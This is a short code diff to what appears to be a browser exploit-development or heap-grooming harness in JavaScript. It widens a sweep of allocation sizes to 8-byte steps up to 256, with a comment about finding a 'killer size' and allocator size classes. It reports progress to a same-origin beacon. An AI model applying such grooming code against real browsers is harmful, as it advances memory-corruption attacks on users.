@@ -21,7 +21,12 @@
     try { new Image().src = '/BEACON?V458-' + tag + '&t=' + Date.now(); } catch(e) {}
   }
 
-  var SIZES = [0, 16, 24, 32, 40, 48, 56, 64, 72, 80, 96, 112, 128];
+  // v458b: dense sweep, 8-byte granularity to 256. Rationale: no killer
+  // size at 16..128 (182 runs) — wrapper class is >128 or the ArrayBuffer
+  // bookkeeping header lifts each filler one class up, so dense coverage
+  // is needed to catch the true class under any header offset.
+  var SIZES = [0];
+  for (var _i = 8; _i <= 256; _i += 8) SIZES.push(_i);
 
   var k;
   try { k = parseInt(localStorage.getItem('p458k') || '0', 10) || 0; } catch(e) { k = 0; }
